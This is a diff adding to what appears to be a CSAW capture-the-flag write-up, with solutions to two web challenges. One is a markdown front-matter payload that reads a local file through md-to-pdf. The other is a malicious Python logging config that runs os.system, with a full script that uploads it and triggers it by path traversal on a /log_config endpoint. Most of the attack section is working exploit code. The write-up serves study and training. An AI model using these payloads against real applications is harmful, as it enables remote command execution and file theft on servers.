@@ -52,6 +52,196 @@ cat ./c4c2b1111710c840107313a395b2716bb193f4335d173f87984ed7ed8c2fc1c8/diff/chal
 
 4. You could use the less brute-force appoach by using command `wget -r -l inf http://web.chal.csaw.io:5010/` or write some python script to run thought all links.
 
+### My Little Website
+
+1. first approach (front matter in markdown)
+```
+---
+launch_options: {headless: true, args: ["--disable-web-security", "--no-sandbox"]}
+---
+<iframe src="file:///flag.txt" width=400 height=600></iframe>
+```
+
+2. https://github.com/simonhaenisch/md-to-pdf/issues/99
+
+
+### Good Intention
+
+1. we can upload file into the server
+2. /log_config is vulnerable to path tarversal
+
+![log_config](./images/log_config.png)
+
+3. So, we create the mallicious log file
+
+```python
+[loggers]
+keys=root,simpleExample
+
+[handlers]
+keys=consoleHandler
+
+[formatters]
+keys=simpleFormatter
+
+[logger_root]
+level=DEBUG
+handlers=consoleHandler
+
+[logger_simpleExample]
+level=DEBUG
+handlers=consoleHandler
+qualname=simpleExample
+propagate=0
+
+[handler_consoleHandler]
+class=__import__('os').system('cat /flag.txt > /app/application/static/docs/piriya.flag')
+level=DEBUG
+formatter=simpleFormatter
+args=('application/static/docs/piriya.log',)
+
+[formatter_simpleFormatter]
+format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
+```
+
+4. then upload log file via APIs (you will get the 500 internal server error but that ok)
+
+```python
+from fileinput import filename
+import requests 
+import json
+
+api_url = "http://web.chal.csaw.io:5012"
+username = "piriya"
+password = "testing"
+
+image_file = "exploit.conf"
+label = "testfile"
+
+
+def register(username, password):
+
+    url = api_url + "/api/register"
+
+    payload = json.dumps({
+       "username": username,
+       "password": password 
+    })
+
+    headers = {
+        'Content-Type': 'application/json'
+    }
+
+    response = requests.request("POST", url, headers=headers, data=payload)
+
+    return response
+
+def login(username, password):
+
+    url = api_url + "/api/login"
+
+    payload = json.dumps({
+        "username": username,
+        "password": password
+    })
+
+    headers = {
+        'Content-Type': 'application/json'
+    }
+
+    connection = requests.Session()
+
+    response = connection.request("POST", url, headers=headers, data=payload)
+
+    return response,connection
+
+def upload(connection, filename, label):
+
+    url = api_url + "/api/upload"
+
+    with open(filename, "rb") as f:
+        data = f.read()
+
+    files = {'file': data}
+    #Edit the label appropriately
+    values = {'label': label}
+
+    response = connection.request("POST", url, files=files, data=values)
+
+    return response
+
+def get_gallery(connection):
+    url = api_url + "/api/gallery"
+    response = connection.request("GET", url)
+    return response
+
+def set_config(connection,filename):
+    url = api_url + "/api/log_config"
+    payload = json.dumps({
+        "filename": filename
+    })
+
+    headers = {
+        'Content-Type': 'application/json'
+    }
+
+    response = connection.request("POST", url, headers=headers, data=payload)
+    return response
+
+def runcmd(connection,cmd):
+    url = api_url + "/api/run_command"
+    payload = json.dumps({
+        "command": cmd
+    })
+
+    headers = {
+        'Content-Type': 'application/json'
+    }
+
+    response = connection.request("POST", url, headers=headers, data=payload)
+    return response
+
+def main():
+    
+    response = register(username, password)
+
+    print(response.text)
+
+    response, connection = login(username, password)
+
+    print(response.text)
+
+    response = upload(connection, image_file, label)
+
+    print(response.text)
+
+    response = get_gallery(connection)
+    print(response.text)
+
+    filename = input("Enter filename: ")
+    filename = "../images/" + filename
+    print(filename)
+    
+    response = set_config(connection,filename)
+
+    print(response.text)
+
+    print(response.cookies)
+
+'''
+    response = runcmd(connection,"whoami")
+
+    print(response.text)
+
+'''
+
+
+if __name__ == "__main__":
+    main()
+```
+
+5. go to http://web.chal.csaw.io:5012/static/docs/piriya.flag to get flag
+
 ## Cryptography
 ### Gotta Crack Them All
 
